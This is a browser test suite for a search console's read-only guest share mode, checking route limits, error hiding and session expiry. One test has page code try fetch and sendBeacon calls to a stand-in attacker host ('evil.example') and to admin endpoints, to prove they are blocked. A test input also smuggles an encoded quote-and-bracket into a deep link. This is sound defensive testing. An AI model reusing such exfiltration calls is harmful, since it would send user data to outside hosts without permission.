// Guest mode, from the UI side: what a share-link guest's tab asks the engine
// for, what it shows when refused, and how the session ends.
// Run: node --test xerj-ux/test/browser/     (needs Chrome; Node >= 22)
import test from 'node:test';
import assert from 'node:assert/strict';
import { setup, skipReason, openGuest, shareRecord, census, assertCensusInert, assertNotPwned, GUEST_KEY } from './harness.mjs';
import { sleep } from './cdp.mjs';
import { LEAK_MARKERS, HOSTILE_ID } from '../fixtures/hostile.mjs';

const skip = skipReason();
let ctx;
test.before(async () => { if (!skip) ctx = await setup(); });
test.after(async () => { if (ctx) await ctx.teardown(); });
test.beforeEach(() => { if (ctx) { ctx.engine.reset(); ctx.engine.state.operator = false; } });

const readerHash = `#/reader?index=ax-inbox&id=${encodeURIComponent(HOSTILE_ID)}`;
const GUEST_ROUTES = [/^POST \/ax-inbox\/_search$/, /^POST \/ax-inbox\/_count$/, /^GET \/ax-inbox\/_mapping$/, /^GET \/_graph\/inbox\/ego$/];
const isGuestRoute = (r) => GUEST_ROUTES.some((re) => re.test(`${r.method} ${r.path}`));

test('a guest tab calls the share\'s four operations and NOTHING else', { skip }, async () => {
  const page = await openGuest(ctx, { hash: readerHash });
  await page.waitFor(`document.querySelector('[data-shape="email"]') && document.querySelector('.rd-egroups')`, { label: 'reader + graph' });
  await page.setHash('#/corpus');
  await page.waitFor(`document.querySelector('[data-corpus-index="ax-inbox"] .cp-card__nums')`, { label: 'corpus card' });

  // Operator routes typed into the address bar land on the guest's corpus
  // view: there is no operator shell in this tab to route to.
  for (const h of ['#/settings', '#/users', '#/data', '#/alerts', '#/dashboards/system', '#/dashboards/second-brain?brain=inbox', '#/discover', '#/manage']) {
    await page.setHash(h);
    await sleep(120);
    const ui = await page.eval(`({ guest: !!document.querySelector('[data-guest-banner]'), nav: [...document.querySelectorAll('nav a')].map((a) => a.textContent), opShell: !!document.querySelector('[data-nav-status], .sbox, [data-safe-mount]') })`);
    assert.ok(ui.guest, `${h}: still the guest shell`);
    assert.deepEqual(ui.nav, ['CORPUS', 'READER'], `${h}: no admin navigation`);
    assert.equal(ui.opShell, false, `${h}: no operator chrome`);
  }

  const api = ctx.engine.apiLog();
  assert.ok(api.length >= 5, 'the guest did talk to the engine');
  const stray = api.filter((r) => !isGuestRoute(r));
  assert.deepEqual(stray.map((r) => `${r.method} ${r.path}`), [], 'requests outside the share\'s four operations');
  assert.deepEqual(api.filter((r) => r.path.startsWith('/_xerj-console/api/')), [], 'a guest never calls a console/admin endpoint — not even /me');
  assert.ok(api.every((r) => r.auth === `ApiKey ${GUEST_KEY}`), 'every data request carries the share key');
  assert.ok(api.every((r) => r.cookie === false), 'and never a cookie');

  // The key rides ONLY on those requests — never on a static asset fetch.
  const withKey = ctx.engine.state.log.filter((r) => r.auth);
  assert.ok(withKey.every(isGuestRoute), 'the Authorization header appears on share operations only');
  const assets = ctx.engine.state.log.filter((r) => r.path.startsWith('/_xerj-console/'));
  assert.ok(assets.length > 5 && assets.every((r) => !r.auth));
  // The operator bundle was never even downloaded.
  const loaded = assets.map((r) => r.path.replace('/_xerj-console/', ''));
  for (const f of ['src/app.js', 'src/xerj-console-sync.js', 'src/data/dashboard-store.js', 'src/data/data-sources.js', 'src/data/mock.js', 'src/data/query.js', 'src/dashboards/registry.js', 'src/dashboards/settings.js', 'src/dashboards/users.js']) {
    assert.ok(!loaded.includes(f), `${f} must not load in a guest tab`);
  }
  assert.ok(loaded.includes('src/guest-app.js') && loaded.includes('src/data/guest.js'));

  // Page code that tries anyway is refused before the network.
  const n = ctx.engine.state.log.length;
  const tries = await page.eval(`Promise.all([
    '/_xerj-console/api/v1/me', '/_xerj-console/api/v1/dashboards', '/_cat/indices', '/_mapping', '/hr-salaries/_search', '/_security/api_key', 'https://evil.example/x',
  ].map((u) => fetch(u, { method: u.includes('_search') || u.includes('api_key') ? 'POST' : 'GET' }).then((r) => r.status, () => 'threw')))`);
  assert.deepEqual(tries, [403, 403, 403, 403, 403, 403, 403]);
  assert.equal(ctx.engine.state.log.length, n, 'none of them reached the server');
  assert.equal(await page.eval('window.__xerjGuestBlocked.length'), 7);
  // …and so is an XMLHttpRequest or a beacon (PR #945 review: only fetch was guarded).
  const xhr = await page.eval(`(() => { try { const x = new XMLHttpRequest(); x.open('GET', '/_xerj-console/api/v1/me'); x.send(); return 'sent'; } catch (e) { return e.name; } })()`);
  assert.equal(xhr, 'SecurityError');
  const beacon = await page.eval(`[navigator.sendBeacon('https://evil.example/b', 'k'), navigator.sendBeacon('/_xerj-console/api/v1/audit', 'k')]`);
  assert.deepEqual(beacon, [false, false]);
  await sleep(150);
  assert.equal(ctx.engine.state.log.length, n, 'neither reached the server');
  assert.deepEqual(await page.eval('window.__xerjGuestBlocked.slice(7)'), ['XHR GET /_xerj-console/api/v1/me', 'BEACON POST https://evil.example', 'BEACON POST /_xerj-console/api/v1/audit']);
  await assertNotPwned(page, ctx.engine.origin, 'guest authz');
  await page.close();
});

test('the banner says guest, read-only, and when it ends', { skip }, async () => {
  const page = await openGuest(ctx, { hash: '#/corpus' });
  await page.waitFor(`document.querySelector('[data-guest-banner-text]')?.textContent.length > 10`);
  const b = await page.eval(`({ text: document.querySelector('[data-guest-banner-text]').textContent, role: document.querySelector('[data-guest-banner]').getAttribute('role'), visible: document.querySelector('[data-guest-banner]').getBoundingClientRect().height > 10, title: document.title, foot: document.querySelector('.guest-foot').textContent })`);
  assert.match(b.text, /^Guest · read-only · Hostile inbox · expires \d{4}-\d{2}-\d{2} \d{2}:\d{2} UTC \(in (59m|1h 0m)\)$/);
  assert.equal(b.role, 'status');
  assert.ok(b.visible);
  assert.equal(b.title, 'Shared view · XERJ');
  assert.match(b.foot, /Read-only view/);
  await page.close();
});

test('a 403 is shown as "not permitted" — none of the engine\'s words reach the page', { skip }, async () => {
  ctx.engine.state.fail = { search: 403, ego: 403 };
  const page = await openGuest(ctx, { hash: readerHash });
  await page.waitFor(`/not permitted/.test(document.querySelector('[data-guest-main]')?.textContent || '')`, { label: 'the refusal' });
  await sleep(250);
  const c = await census(page, '#app');
  for (const m of LEAK_MARKERS) assert.ok(!c.text.includes(m), `the page leaks ${m}`);
  assert.ok(/Search failed: not permitted\. Nothing is shown in its place\./.test(c.text));
  assert.equal(await page.eval(`document.querySelectorAll('.rd-card').length`), 0, 'no result cards under a refused search');
  // a 403 is an answer, not the end of the session
  assert.ok(await page.eval(`!!document.querySelector('[data-guest-banner]') && sessionStorage.getItem('xerj.share') !== null`));
  assert.deepEqual(page.consoleMessages.filter((l) => LEAK_MARKERS.some((m) => l.includes(m))), [], 'nor the console');

  // Graph refused, records allowed: the panel says the share has no graph.
  ctx.engine.state.fail = { ego: 403 };
  await page.setHash('#/corpus'); await page.setHash(readerHash);
  await page.waitFor(`/This share does not include the knowledge graph/.test(document.querySelector('.rd-graph')?.textContent || '')`, { label: 'graph denied state' });
  const g = await census(page, '.rd-graph');
  for (const m of [...LEAK_MARKERS, 'HTTP 403', 'API key', 'xerj brain']) assert.ok(!g.text.includes(m), `graph panel leaks ${m}`);
  assert.ok(await page.eval(`!!document.querySelector('[data-shape="email"]')`), 'the record itself still renders');
  await page.close();
});

test('a 401 (revoked key) logs the guest out and forgets the key', { skip }, async () => {
  const page = await openGuest(ctx, { hash: readerHash });
  await page.waitFor(`document.querySelector('[data-shape="email"]')`);
  ctx.engine.state.fail = { all: 401 };
  await page.eval(`(() => { const i = document.querySelector('.rd-q'); i.value = 'anything'; i.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', bubbles: true })); return true; })()`);
  await page.waitFor(`document.querySelector('[data-guest-ended="unauthorized"]')`, { label: 'the ended screen' });
  const s = await page.eval(`({ key: sessionStorage.getItem('xerj.share'), text: document.getElementById('app').textContent, banner: !!document.querySelector('[data-guest-banner]'), cards: document.querySelectorAll('.rd-card, [data-shape]').length })`);
  assert.equal(s.key, null, 'the key is removed from sessionStorage');
  assert.equal(s.banner, false);
  assert.equal(s.cards, 0, 'the documents are gone from the page');
  assert.match(s.text, /NO LONGER VALID/);
  for (const m of LEAK_MARKERS) assert.ok(!s.text.includes(m));
  // and nothing more is asked of the engine
  ctx.engine.state.fail = {};
  const n = ctx.engine.apiLog().length;
  await page.setHash('#/corpus'); await page.setHash(readerHash);
  await sleep(300);
  assert.equal(ctx.engine.apiLog().length, n, 'no request after logout');
  await page.close();
});

test('expiry logs the guest out — on the timer, with no click', { skip }, async () => {
  const page = await openGuest(ctx, { record: shareRecord({ expires_at: new Date(Date.now() + 2500).toISOString() }), hash: readerHash });
  await page.waitFor(`document.querySelector('[data-shape="email"]')`, { label: 'the record, before expiry' });
  assert.match(await page.eval(`document.querySelector('[data-guest-banner-text]').textContent`), /expires .* \(in \ds\)/);
  await page.waitFor(`document.querySelector('[data-guest-ended="expired"]')`, { timeoutMs: 8000, label: 'the expired screen' });
  const s = await page.eval(`({ key: sessionStorage.getItem('xerj.share'), text: document.getElementById('app').textContent, docs: document.querySelectorAll('[data-shape], .rd-card').length })`);
  assert.equal(s.key, null);
  assert.equal(s.docs, 0);
  assert.match(s.text, /THIS SHARE HAS EXPIRED/);
  const n = ctx.engine.apiLog().length;
  await page.setHash('#/reader?index=ax-inbox&id=att-1');
  await sleep(300);
  assert.equal(ctx.engine.apiLog().length, n, 'an expired tab asks the engine for nothing');
  // Reloading does not bring it back: the record is gone, the operator login takes over.
  await page.close();
});

test('an already-expired or malformed record never boots a session (fails closed)', { skip }, async () => {
  for (const [why, record] of [
    ['expired', shareRecord({ expires_at: new Date(Date.now() - 1000).toISOString() })],
    ['no expiry', shareRecord({ expires_at: null })],
    ['wildcard index', shareRecord({ index: '*' })],
    ['system index', shareRecord({ index: '.xerj_users' })],
    ['not json', 'this is not json'],
  ]) {
    ctx.engine.reset();
    const page = await openGuest(ctx, { record, hash: readerHash });
    await page.waitFor(`document.querySelector('[data-guest-ended]')`, { label: `${why}: ended screen` });
    const s = await page.eval(`({ reason: document.querySelector('[data-guest-ended]').getAttribute('data-guest-ended'), key: sessionStorage.getItem('xerj.share') })`);
    assert.equal(s.reason, 'invalid', why);
    assert.equal(s.key, null, `${why}: the record is cleared`);
    assert.deepEqual(ctx.engine.apiLog(), [], `${why}: no request was made — not with the key, not to /me`);
    await page.close();
  }
});

test('LEAVE ends the session on request', { skip }, async () => {
  const page = await openGuest(ctx, { hash: '#/corpus' });
  await page.waitFor(`document.querySelector('[data-guest-leave]')`);
  await page.eval(`(document.querySelector('[data-guest-leave]').click(), true)`);
  await page.waitFor(`document.querySelector('[data-guest-ended="left"]')`);
  assert.equal(await page.eval(`sessionStorage.getItem('xerj.share')`), null);
  await page.close();
});

test('without a share record the tab is the operator console: /me → login', { skip }, async () => {
  const page = await ctx.browser.newPage();
  await page.goto(`${ctx.engine.origin}/_xerj-console/`);
  await page.waitFor(`location.pathname === '/_xerj-console/login'`, { label: 'redirect to login' });
  const api = ctx.engine.apiLog();
  assert.deepEqual(api.map((r) => `${r.method} ${r.path}`), ['GET /_xerj-console/api/v1/me']);
  await page.close();
});

test('MAJOR (PR #945 review): the guest CORPUS view asks again after a failed load — it does not cache "could not read" for the life of the tab', { skip }, async () => {
  // Reviewer's repro on a real node: kill the engine, open #/corpus ("Could not
  // read this index: engine unreachable"), restart the engine — the Reader
  // recovers, the corpus view kept the failure until the tab was reloaded.
  ctx.engine.state.fail = { search: 503 };
  const page = await openGuest(ctx, { hash: '#/corpus' });
  await page.waitFor(`/Could not read this index/.test(document.querySelector('[data-guest-corpus]')?.textContent || '')`, { label: 'the failed card' });
  assert.match(await page.eval(`document.querySelector('[data-guest-corpus]').textContent`), /asks again/i, 'the failed card says the page retries');
  ctx.engine.state.fail = {};
  await page.setHash('#/reader'); await page.setHash('#/corpus');
  await page.waitFor(`document.querySelector('[data-corpus-index="ax-inbox"] .cp-card__nums')`, { label: 'the recovered card — with NO reload' });
  assert.ok(!/Could not read/.test(await page.eval(`document.querySelector('[data-guest-corpus]').textContent`)));
  // a good answer IS kept: coming back does not ask again
  const n = ctx.engine.apiLog().filter((r) => r.body && r.body.aggs).length;
  await page.setHash('#/reader'); await page.setHash('#/corpus');
  await sleep(250);
  assert.equal(ctx.engine.apiLog().filter((r) => r.body && r.body.aggs).length, n, 'a successful summary is cached');
  await page.close();
});

test('BLOCKER (PR #945 review): an incomplete attachment list SAYS so in the page; the join is by file and asks for light records', { skip }, async () => {
  ctx.engine.state.attachmentRecords = 6000; // the engine holds more attachment records than the reader will read
  const page = await openGuest(ctx, { hash: readerHash });
  await page.waitFor(`document.querySelector('[data-rd-block="attachments-truncated"]')`, { label: 'the incomplete-list notice' });
  const t = await page.eval(`document.querySelector('[data-rd-block="attachments"]').textContent`);
  assert.match(t, /ATTACHMENTS · 2\+/);
  assert.match(t, /6000 attachment records/);
  assert.match(t, /not listed/);
  const join = ctx.engine.apiLog().map((r) => r.body).find((b) => b && b._source && JSON.stringify(b.query).includes('attachment_name'));
  assert.ok(join, 'the attachment join was sent');
  assert.ok(JSON.stringify(join.query).includes('"ax_file"') && !JSON.stringify(join.query).includes('email_message_id'), 'joined on the file, not the Message-ID');
  assert.ok(!join._source.includes('body'), 'page text is not fetched for a list of names');
  assertCensusInert(await census(page, '[data-guest-main]'), 'reader with the notice');
  await assertNotPwned(page, ctx.engine.origin, 'reader with the notice');
  await page.close();
});

test('minors (PR #945 review): TERM with free text searches NOTHING and says the syntax; SHOW MORE pages past the first 25', { skip }, async () => {
  const page = await openGuest(ctx, { hash: '#/reader' });
  await page.waitFor(`document.querySelectorAll('.rd-card').length > 0`, { label: 'first results' });
  const before = ctx.engine.apiLog().length;
  await page.eval(`(() => { const i = document.querySelector('.rd-q'); i.value = 'zebrafish'; const s = document.querySelector('.rd-type'); s.value = 'term'; s.dispatchEvent(new Event('change', { bubbles: true })); return true; })()`);
  await page.waitFor(`/TERM needs field=value/.test(document.querySelector('[data-guest-main]')?.textContent || '')`, { label: 'the syntax message' });
  assert.equal(await page.eval(`document.querySelectorAll('.rd-card').length`), 0, 'no record is presented as a result');
  assert.equal(ctx.engine.apiLog().length, before, 'and nothing was asked of the engine (it used to be match_all)');
  assert.match(await page.eval(`document.querySelector('.rd-q').getAttribute('placeholder')`), /field=value/);

  ctx.engine.state.searchTotal = 60;
  await page.eval(`(() => { const s = document.querySelector('.rd-type'); s.value = 'match'; const i = document.querySelector('.rd-q'); i.value = 'invoice'; s.dispatchEvent(new Event('change', { bubbles: true })); return true; })()`);
  await page.waitFor(`document.querySelector('[data-rd-more]')`, { label: 'SHOW MORE' });
  assert.match(await page.eval(`document.querySelector('[data-rd-slot="list-head"]').textContent`), /60 RESULTS · SHOWING/);
  await page.eval(`(document.querySelector('[data-rd-more]').click(), true)`);
  await page.waitFor(`true`, {});
  await sleep(250);
  const sizes = ctx.engine.apiLog().map((r) => r.body).filter((b) => b && b.highlight).map((b) => b.size);
  assert.deepEqual(sizes.slice(-2), [25, 50], 'the next request asks for 25 more');
  await page.close();
});

test('minor (PR #945 review): a guest who RELOADS after the share ended sees the ended screen again — not the operator passkey login', { skip }, async () => {
  const page = await openGuest(ctx, { hash: '#/corpus' });
  await page.waitFor(`document.querySelector('[data-guest-leave]')`);
  await page.eval(`(document.querySelector('[data-guest-leave]').click(), true)`);
  await page.waitFor(`document.querySelector('[data-guest-ended="left"]')`, { label: 'ended: left' });
  const n = ctx.engine.apiLog().length;
  await page.goto(`${ctx.engine.origin}/_xerj-console/#/reader?index=ax-inbox`);
  await page.waitFor(`document.querySelector('[data-guest-ended="left"]')`, { label: 'the same ended screen after a reload' });
  const st = await page.eval(`({ path: location.pathname, share: sessionStorage.getItem('xerj.share'), ended: sessionStorage.getItem('xerj.share.ended'), all: JSON.stringify(Object.entries(sessionStorage)) })`);
  assert.equal(st.path, '/_xerj-console/', 'no bounce to /login');
  assert.equal(st.share, null);
  assert.equal(st.ended, 'left');
  assert.ok(!st.all.includes(GUEST_KEY), 'the marker holds no key');
  assert.equal(ctx.engine.apiLog().length, n, 'and the reload asked the engine for nothing — not even /me');
  // the engine's operator has a way out of it
  await page.eval(`(document.querySelector('[data-guest-operator]').click(), true)`);
  await page.waitFor(`location.pathname === '/_xerj-console/login'`, { label: 'operator sign-in' });
  assert.equal(await page.eval(`sessionStorage.getItem('xerj.share.ended')`), null);
  await page.close();
});

test('minor (PR #945 review): a reader deep link opened without a session is remembered across the login redirect', { skip }, async () => {
  const page = await ctx.browser.newPage();
  const link = '#/reader?index=ax-inbox&id=abc%22%3E';
  await page.goto(`${ctx.engine.origin}/_xerj-console/${link}`);
  await page.waitFor(`location.pathname === '/_xerj-console/login'`, { label: 'redirect to login' });
  assert.equal(await page.eval(`sessionStorage.getItem('xerj.next')`), link, 'login.html takes this back out after the passkey ceremony (data/next-route.js#takeNext)');
  await page.close();
});
